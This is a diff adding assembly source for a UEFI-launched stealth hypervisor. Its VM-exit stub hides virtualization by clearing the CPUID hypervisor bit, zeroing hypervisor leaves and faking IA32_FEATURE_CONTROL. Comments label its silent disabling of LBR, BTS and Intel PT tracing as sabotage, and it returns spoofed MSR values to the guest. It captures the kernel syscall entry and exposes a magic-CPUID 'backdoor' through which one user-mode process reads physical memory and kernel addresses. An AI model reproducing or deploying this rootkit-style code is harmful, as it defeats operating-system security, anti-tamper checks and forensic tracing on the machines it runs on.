@@ -1,0 +1,683 @@
+bits 64
+default rel
+
+global AsmVmexitHandler
+global AsmVmlaunch
+global AsmVmlaunchAndCaptureState
+global MinimalVmexitHandlerStart
+global MinimalVmexitHandlerEnd
+global __invept
+extern VmexitDispatcher
+
+
+section .text
+
+; ============================================================
+; AsmVmexitHandler - runs in VMX-root on every VM-Exit
+; Used only if we're still in EFI environment.
+; ============================================================
+AsmVmexitHandler:
+    push rax
+    push rbx
+    push rcx
+    push rdx
+    push rsi
+    push rdi
+    push rbp
+    push r8
+    push r9
+    push r10
+    push r11
+    push r12
+    push r13
+    push r14
+    push r15
+
+    mov  rcx, rsp          ; ptr to GUEST_REGISTERS (1st arg)
+    sub  rsp, 0x28         ; shadow space
+    call VmexitDispatcher
+    add  rsp, 0x28
+
+    pop r15
+    pop r14
+    pop r13
+    pop r12
+    pop r11
+    pop r10
+    pop r9
+    pop r8
+    pop rbp
+    pop rdi
+    pop rsi
+    pop rdx
+    pop rcx
+    pop rbx
+    pop rax
+
+    vmresume
+    hlt
+    jmp $
+
+; ============================================================
+; MinimalVmexitHandlerStart
+; Position-independent VM-Exit stub copied to EfiRuntimeServicesData.
+;
+; The Vmcs.c places a 64-byte state header BEFORE this code:
+;   [base + 0]   QWORD  debug log page physical address
+;   [base + 8]   QWORD  exit-reason counter
+;   [base + 16]  QWORD  virtual IA32_DEBUGCTL
+;   [base + 24]  QWORD  virtual IA32_RTIT_CTL
+;   [base + 32]  QWORD  captured LSTAR (kernel base)
+;   [base + 40]  QWORD  authenticated CR3
+;   [base + 48]  QWORD  backdoor flags (bit 0 = enabled)
+;   [base + 56]  QWORD  reserved
+; HOST_RIP = base + 64  (first byte of this code).
+;
+; Stack layout after pushes:
+;   [rsp+48] = saved RAX   (guest RAX)
+;   [rsp+40] = saved RBX   (guest RBX)
+;   [rsp+32] = saved RCX   (guest RCX)
+;   [rsp+24] = saved RDX   (guest RDX)
+;   [rsp+16] = saved R13
+;   [rsp+ 8] = saved R14
+;   [rsp+ 0] = saved R15
+; ============================================================
+
+; Header field offsets
+%define HDR_DEBUGLOG    0
+%define HDR_EXITCOUNT   8
+%define HDR_VDEBUGCTL   16
+%define HDR_VRTITCTL    24
+%define HDR_LSTAR       32
+%define HDR_AUTH_CR3    40
+%define HDR_BD_FLAGS    48
+%define HDR_SIZE        64
+
+; Guest register offsets on stack (after 7 pushes)
+%define STK_RAX  48
+%define STK_RBX  40
+%define STK_RCX  32
+%define STK_RDX  24
+%define STK_R13  16
+%define STK_R14   8
+%define STK_R15   0
+
+; Exit reasons
+%define EXIT_CPUID   0x0A
+%define EXIT_HLT     0x0C
+%define EXIT_INVD    0x0D
+%define EXIT_VMCALL  0x12
+%define EXIT_CR      0x1C
+%define EXIT_IO      0x1E
+%define EXIT_RDMSR   0x1F
+%define EXIT_WRMSR   0x20
+%define EXIT_EPT     0x30
+%define EXIT_RDRAND  0x39
+%define EXIT_XSETBV  0x37
+%define EXIT_RDSEED  0x3D
+
+; Backdoor constants
+%define SYNEX_LEAF   0x1337BEEF
+%define SYNEX_MAGIC  0x53594E58
+
+MinimalVmexitHandlerStart:
+    push rax
+    push rbx
+    push rcx
+    push rdx
+    push r13
+    push r14
+    push r15
+
+    ; ── Read exit reason ──────────────────────────────────────
+    mov  rcx, 0x4402
+    vmread rbx, rcx
+    and  rbx, 0xFFFF
+
+    ; ── Get header base address (position-independent) ────────
+    lea  rax, [rel .anchor]
+.anchor:
+    sub  rax, (.anchor - MinimalVmexitHandlerStart) + HDR_SIZE
+    mov  r14, rax              ; r14 = header base (kept throughout)
+
+    ; ── Debug ring buffer (first 64 exits) ────────────────────
+    mov  rcx, [r14 + HDR_EXITCOUNT]
+    cmp  rcx, 64
+    jge  .log_done
+    inc  qword [r14 + HDR_EXITCOUNT]
+
+    mov  rdx, [r14 + HDR_DEBUGLOG]
+    test rdx, rdx
+    jz   .log_done
+    shl  rcx, 2
+    add  rdx, rcx
+    mov  [rdx],   bl
+    mov  [rdx+1], bh
+    mov  word [rdx+2], 0
+
+.log_done:
+
+    ; ─────────────────────────────────────────────────────────
+    ; EXIT REASON DISPATCH
+    ; ─────────────────────────────────────────────────────────
+
+    ; ── CPUID (0x0A) ─────────────────────────────────────────
+    cmp  rbx, EXIT_CPUID
+    jne  .not_cpuid
+
+    mov  rax, [rsp + STK_RAX]   ; guest EAX (leaf)
+    mov  rcx, [rsp + STK_RCX]   ; guest ECX (subleaf)
+
+    ; --- SYNEX BACKDOOR CHECK ---
+    cmp  eax, SYNEX_LEAF
+    jne  .no_backdoor
+    cmp  dword [rsp + STK_RDX], SYNEX_MAGIC
+    jne  .no_backdoor
+
+    ; Check CPL == 3 from guest CS selector
+    push rax
+    mov  rcx, 0x0802            ; GUEST_CS_SELECTOR
+    vmread rax, rcx
+    and  eax, 3
+    cmp  eax, 3
+    pop  rax
+    jne  .backdoor_reject
+
+    ; Read guest CR3 for authentication
+    push rax
+    mov  rcx, 0x6802            ; GUEST_CR3
+    vmread r13, rcx
+    pop  rax
+
+    mov  ecx, [rsp + STK_RCX]  ; subleaf = operation
+
+    ; ── Op 0: Init / Authenticate ──
+    cmp  ecx, 0
+    jne  .bd_op1
+    ; Check if already locked to another CR3
+    mov  rax, [r14 + HDR_AUTH_CR3]
+    test rax, rax
+    jz   .bd_op0_fresh
+    cmp  rax, r13
+    je   .bd_op0_ok
+    ; Locked to different process — R11 = 1
+    jmp  .bd_op0_locked
+
+.bd_op0_fresh:
+    mov  [r14 + HDR_AUTH_CR3], r13
+    or   qword [r14 + HDR_BD_FLAGS], 1
+.bd_op0_ok:
+    mov  qword [rsp + STK_RAX], 0    ; result code 0 = success
+    jmp  .bd_done_success
+
+.bd_op0_locked:
+    mov  qword [rsp + STK_RAX], 1
+    jmp  .bd_done_fail
+
+    ; ── Op 1: TranslateVirtual ──
+.bd_op1:
+    cmp  ecx, 1
+    jne  .bd_op2
+
+    ; Check authentication
+    mov  rax, [r14 + HDR_BD_FLAGS]
+    test rax, 1
+    jz   .bd_not_auth
+    mov  rax, [r14 + HDR_AUTH_CR3]
+    cmp  rax, r13
+    jne  .bd_not_auth
+
+    ; R8 = guest virtual address to translate
+    ; R8 is not on our stack, we need it from the actual register
+    ; After pushes, R8 is still in R8 (only rax,rbx,rcx,rdx,r13,r14,r15 pushed)
+    ; Wait - r13, r14, r15 are pushed, so r8 is untouched. Good.
+    mov  rax, r8                ; GVA to translate
+    mov  rcx, [r14 + HDR_AUTH_CR3] ; CR3 for page walk
+
+    ; --- Inline 4-level page table walk ---
+    ; rcx = CR3, rax = GVA
+    mov  r15, rax               ; save GVA in r15
+    mov  r13, 0x000FFFFFFFFFF000 ; PhysMask
+
+    ; PML4
+    and  rcx, r13               ; CR3 & mask = PML4 base
+    mov  rdx, r15
+    shr  rdx, 39
+    and  edx, 0x1FF             ; PML4 index
+    mov  rax, [rcx + rdx*8]     ; PML4E
+    test al, 1
+    jz   .translate_fail
+
+    ; PDPT
+    and  rax, r13
+    mov  rdx, r15
+    shr  rdx, 30
+    and  edx, 0x1FF
+    mov  rax, [rax + rdx*8]     ; PDPTE
+    test al, 1
+    jz   .translate_fail
+    test al, 0x80               ; 1GB huge page?
+    jnz  .translate_1gb
+
+    ; PD
+    and  rax, r13
+    mov  rdx, r15
+    shr  rdx, 21
+    and  edx, 0x1FF
+    mov  rax, [rax + rdx*8]     ; PDE
+    test al, 1
+    jz   .translate_fail
+    test al, 0x80               ; 2MB large page?
+    jnz  .translate_2mb
+
+    ; PT
+    and  rax, r13
+    mov  rdx, r15
+    shr  rdx, 12
+    and  edx, 0x1FF
+    mov  rax, [rax + rdx*8]     ; PTE
+    test al, 1
+    jz   .translate_fail
+
+    ; 4KB page
+    and  rax, r13
+    mov  rdx, r15
+    and  edx, 0xFFF
+    or   rax, rdx               ; GPA = (PTE & mask) | offset
+    jmp  .translate_ok
+
+.translate_1gb:
+    mov  r13, 0x000FFFFFC0000000 ; 1GB-aligned phys mask
+    and  rax, r13
+    mov  rdx, r15
+    and  edx, 0x3FFFFFFF        ; offset within 1GB
+    or   rax, rdx
+    jmp  .translate_ok
+
+.translate_2mb:
+    mov  r13, 0x000FFFFFFFE00000 ; 2MB-aligned phys mask
+    and  rax, r13
+    mov  rdx, r15
+    and  edx, 0x1FFFFF          ; offset within 2MB
+    or   rax, rdx
+    jmp  .translate_ok
+
+.translate_fail:
+    ; R10 = 0, R11 = 3 (translation fail)
+    xor  r10, r10
+    mov  qword [rsp + STK_RAX], 3
+    jmp  .advance_rip
+
+.translate_ok:
+    mov  r10, rax               ; R10 = GPA result
+    mov  qword [rsp + STK_RAX], 0 ; R11=0 via RAX (we'll fix below)
+    jmp  .bd_done_success
+
+    ; ── Op 2: ReadPhysical (16 bytes at GPA in R8) ──
+.bd_op2:
+    cmp  ecx, 2
+    jne  .bd_op5
+
+    mov  rax, [r14 + HDR_BD_FLAGS]
+    test rax, 1
+    jz   .bd_not_auth
+    mov  rax, [r14 + HDR_AUTH_CR3]
+    cmp  rax, r13
+    jne  .bd_not_auth
+
+    ; R8 = GPA to read
+    test r8, r8
+    jz   .bd_read_fail
+    mov  r10, [r8]              ; first 8 bytes
+    mov  r9,  [r8 + 8]         ; second 8 bytes
+    mov  qword [rsp + STK_RAX], 0
+    jmp  .bd_done_success
+
+.bd_read_fail:
+    mov  qword [rsp + STK_RAX], 4
+    jmp  .bd_done_fail
+
+    ; ── Op 5: GetLogBuffer ──
+.bd_op5:
+    cmp  ecx, 5
+    jne  .bd_op10
+
+    mov  rax, [r14 + HDR_BD_FLAGS]
+    test rax, 1
+    jz   .bd_not_auth
+
+    ; Return log buffer address from header
+    ; (Uses the memory log buffer, not the debug ring buffer)
+    ; For now, return 0 as placeholder - ComLogger buffer addr not stored in header
+    xor  r10, r10
+    mov  qword [rsp + STK_RAX], 0
+    jmp  .bd_done_success
+
+    ; ── Op 10: GetKernelBase ──
+.bd_op10:
+    cmp  ecx, 10
+    jne  .bd_unknown
+
+    mov  rax, [r14 + HDR_BD_FLAGS]
+    test rax, 1
+    jz   .bd_not_auth
+
+    mov  r10, [r14 + HDR_LSTAR]
+    mov  qword [rsp + STK_RAX], 0
+    jmp  .bd_done_success
+
+.bd_unknown:
+    mov  qword [rsp + STK_RAX], 0xFF
+    jmp  .bd_done_fail
+
+.bd_not_auth:
+    mov  qword [rsp + STK_RAX], 2
+    jmp  .bd_done_fail
+
+.backdoor_reject:
+    ; Non-ring-3 caller - fall through to normal CPUID
+    mov  rax, [rsp + STK_RAX]
+    mov  rcx, [rsp + STK_RCX]
+    jmp  .no_backdoor
+
+.bd_done_success:
+    ; For backdoor: guest expects results in R10, R11
+    ; R10 is still a live register (not saved to stack), so it's already set
+    ; R11 is also a live register. We stored result code in [rsp+STK_RAX]
+    ; but we actually need it in R11. So move it now:
+    mov  r11, [rsp + STK_RAX]
+    mov  qword [rsp + STK_RAX], 0  ; Restore RAX to something benign
+    jmp  .advance_rip
+
+.bd_done_fail:
+    mov  r11, [rsp + STK_RAX]
+    mov  qword [rsp + STK_RAX], 0
+    jmp  .advance_rip
+
+    ; --- NORMAL CPUID PATH ---
+.no_backdoor:
+    ; Hypervisor leaves -> zero out
+    cmp  eax, 0x40000000
+    jb   .not_hv_leaf
+    cmp  eax, 0x400000FF
+    ja   .not_hv_leaf
+    xor  eax, eax
+    xor  ebx, ebx
+    xor  ecx, ecx
+    xor  edx, edx
+    jmp  .cpuid_store
+
+.not_hv_leaf:
+    cmp  eax, 1
+    je   .cpuid_leaf1
+    cmp  eax, 7
+    je   .cpuid_leaf7
+    jmp  .cpuid_exec
+
+.cpuid_leaf1:
+    cpuid
+    btr  ecx, 31            ; Clear HypervisorPresent
+    jmp  .cpuid_store
+
+.cpuid_leaf7:
+    jmp  .cpuid_exec
+
+.cpuid_exec:
+    cpuid
+
+.cpuid_store:
+    mov  [rsp + STK_RAX], rax
+    mov  [rsp + STK_RBX], rbx
+    mov  [rsp + STK_RCX], rcx
+    mov  [rsp + STK_RDX], rdx
+    jmp  .advance_rip
+
+.not_cpuid:
+    ; ── HLT (0x0C) ───────────────────────────────────────────
+    cmp  rbx, EXIT_HLT
+    jne  .not_hlt
+    jmp  .advance_rip
+
+.not_hlt:
+    ; ── RDRAND (0x39) / RDSEED (0x3D) ────────────────────────
+    cmp  rbx, EXIT_RDRAND
+    je   .handle_rand
+    cmp  rbx, EXIT_RDSEED
+    jne  .not_rand
+.handle_rand:
+    ; Set CF=1 in guest RFLAGS to indicate success
+    mov  rcx, 0x6820
+    vmread rax, rcx
+    or   rax, 1
+    vmwrite rcx, rax
+    jmp  .advance_rip
+
+.not_rand:
+    ; ── RDMSR (0x1F) ─────────────────────────────────────────
+    cmp  rbx, EXIT_RDMSR
+    jne  .not_rdmsr
+    mov  rcx, [rsp + STK_RCX]  ; guest ECX = MSR number
+
+    ; IA32_DEBUGCTL (0x1D9) - return virtual value
+    cmp  ecx, 0x1D9
+    jne  .rdmsr_not_debugctl
+    mov  rax, [r14 + HDR_VDEBUGCTL]
+    mov  rdx, rax
+    shr  rdx, 32
+    and  eax, 0xFFFFFFFF
+    jmp  .rdmsr_done
+
+.rdmsr_not_debugctl:
+    ; IA32_RTIT_CTL (0x570) - return virtual value
+    cmp  ecx, 0x570
+    jne  .rdmsr_not_rtit
+    mov  rax, [r14 + HDR_VRTITCTL]
+    mov  rdx, rax
+    shr  rdx, 32
+    and  eax, 0xFFFFFFFF
+    jmp  .rdmsr_done
+
+.rdmsr_not_rtit:
+    ; IA32_FEATURE_CONTROL (0x3A) - hide VMX BIOS enablement
+    cmp  ecx, 0x3A
+    jne  .do_rdmsr
+    mov  eax, 1
+    xor  edx, edx
+    jmp  .rdmsr_done
+
+.do_rdmsr:
+    rdmsr
+
+.rdmsr_done:
+    mov  [rsp + STK_RAX], rax
+    mov  [rsp + STK_RDX], rdx
+    jmp  .advance_rip
+
+.not_rdmsr:
+    ; ── WRMSR (0x20) ─────────────────────────────────────────
+    cmp  rbx, EXIT_WRMSR
+    jne  .not_wrmsr
+    mov  rcx, [rsp + STK_RCX]  ; MSR number
+    mov  rax, [rsp + STK_RAX]  ; low 32
+    mov  rdx, [rsp + STK_RDX]  ; high 32
+
+    ; IA32_DEBUGCTL (0x1D9) - sabotage LBR and BTS
+    cmp  ecx, 0x1D9
+    jne  .wrmsr_not_debugctl
+    ; Compose full 64-bit value: (EDX << 32) | EAX
+    mov  r15d, edx             ; zero-extend low 32 bits
+    shl  r15, 32
+    mov  r13d, eax             ; zero-extend low 32 bits
+    or   r15, r13
+    mov  [r14 + HDR_VDEBUGCTL], r15
+    ; Sabotage: clear LBR (bit 0) and BTS (bit 7)
+    and  eax, 0xFFFFFF7E       ; ~0x81
+    wrmsr
+    jmp  .advance_rip
+
+.wrmsr_not_debugctl:
+    ; IA32_RTIT_CTL (0x570) - sabotage TraceEn
+    cmp  ecx, 0x570
+    jne  .wrmsr_not_rtit
+    mov  r15d, edx
+    shl  r15, 32
+    mov  r13d, eax
+    or   r15, r13
+    mov  [r14 + HDR_VRTITCTL], r15
+    ; Sabotage: clear TraceEn (bit 0)
+    and  eax, 0xFFFFFFFE
+    wrmsr
+    jmp  .advance_rip
+
+.wrmsr_not_rtit:
+    ; IA32_LSTAR (0xC0000082) - capture kernel syscall entry
+    cmp  ecx, 0xC0000082
+    jne  .do_wrmsr
+    mov  r15d, edx
+    shl  r15, 32
+    mov  r13d, eax
+    or   r15, r13
+    mov  [r14 + HDR_LSTAR], r15
+    ; Pass through the real write
+.do_wrmsr:
+    wrmsr
+    jmp  .advance_rip
+
+.not_wrmsr:
+    ; ── XSETBV (0x37) ────────────────────────────────────────
+    cmp  rbx, EXIT_XSETBV
+    jne  .not_xsetbv
+    mov  rcx, [rsp + STK_RCX]
+    mov  rax, [rsp + STK_RAX]
+    mov  rdx, [rsp + STK_RDX]
+    xsetbv
+    jmp  .advance_rip
+
+.not_xsetbv:
+    ; ── INVD (0x0D) ──────────────────────────────────────────
+    cmp  rbx, EXIT_INVD
+    jne  .not_invd
+    wbinvd
+    jmp  .advance_rip
+
+.not_invd:
+    ; ── IO instruction (0x1E) ────────────────────────────────
+    cmp  rbx, EXIT_IO
+    jne  .not_io
+    jmp  .advance_rip
+
+.not_io:
+    ; ── VMCALL (0x12) ────────────────────────────────────────
+    cmp  rbx, EXIT_VMCALL
+    jne  .not_vmcall
+    mov  qword [rsp + STK_RAX], 0   ; RAX = 0
+    jmp  .advance_rip
+
+.not_vmcall:
+    ; ── EPT Violation (0x30) ─────────────────────────────────
+    cmp  rbx, EXIT_EPT
+    jne  .not_ept
+    ; No handler — just resume without advancing RIP.
+    jmp  .resume_only
+
+.not_ept:
+    ; ── CR Access (0x1C) ─────────────────────────────────────
+    cmp  rbx, EXIT_CR
+    jne  .not_cr
+    jmp  .advance_rip
+
+.not_cr:
+    ; ── Unknown exit — halt (prevents infinite loop) ─────────
+    cli
+    hlt
+    jmp  $ - 2
+
+    ; ─────────────────────────────────────────────────────────
+.advance_rip:
+    mov  rcx, 0x440C
+    vmread rdx, rcx         ; instruction length
+    mov  rcx, 0x681E
+    vmread rax, rcx         ; current GUEST_RIP
+    add  rax, rdx
+    vmwrite rcx, rax        ; write new GUEST_RIP
+
+.resume_only:
+    pop  r15
+    pop  r14
+    pop  r13
+    pop  rdx
+    pop  rcx
+    pop  rbx
+    pop  rax
+    vmresume
+    hlt
+    jmp  $ - 2
+MinimalVmexitHandlerEnd:
+
+; ============================================================
+; AsmVmlaunch - simple VMLAUNCH, returns 0 on failure
+; ============================================================
+AsmVmlaunch:
+    vmlaunch
+    xor eax, eax
+    ret
+
+; ============================================================
+; AsmVmlaunchAndCaptureState
+;
+; Captures current RIP and RSP into VMCS as Guest state,
+; then executes VMLAUNCH.
+;
+; After VMLAUNCH: guest resumes at caller's return site.
+; If VMLAUNCH fails: execution falls through (caller continues).
+; ============================================================
+AsmVmlaunchAndCaptureState:
+    ; [rsp+0] = return address (becomes Guest RIP)
+    mov  rax, [rsp]        ; Guest RIP = return address
+    lea  rdx, [rsp+8]      ; Guest RSP = RSP after ret consumed
+
+    ; VMWRITE GUEST_RIP (0x681E)
+    mov  rcx, 0x681E
+    vmwrite rcx, rax
+
+    ; VMWRITE GUEST_RSP (0x681C)
+    mov  rcx, 0x681C
+    vmwrite rcx, rdx
+
+    ; Launch
+    vmlaunch
+
+    ; If we get here, VMLAUNCH failed!
+    xor rax, rax
+    ret
+
+; ============================================================
+; AsmVmxon - robust assembly wrapper for Intel VMXON
+; RCX = VMXON region physical address (64-bit)
+; Returns: 0 on success, 1 on fail (CF=1), 2 on fail (ZF=1)
+; ============================================================
+global AsmVmxon
+AsmVmxon:
+    push rcx               ; Store physical address in memory on stack
+    vmxon [rsp]            ; Execute vmxon with memory operand
+    pop rcx                ; Restore stack pointer
+    jc .fail_carry
+    jz .fail_zero
+    xor al, al             ; Return 0 on success
+    ret
+
+.fail_carry:
+    mov al, 1              ; Return 1 on Carry Flag
+    ret
+
+.fail_zero:
+    mov al, 2              ; Return 2 on Zero Flag
+    ret
+
+; ============================================================
+; __invept - dynamic EPT TLB invalidation wrapper for compiler
+; RCX = Type, RDX = Pointer to 128-bit descriptor
+; ============================================================
+__invept:
+    invept rcx, [rdx]
+    ret
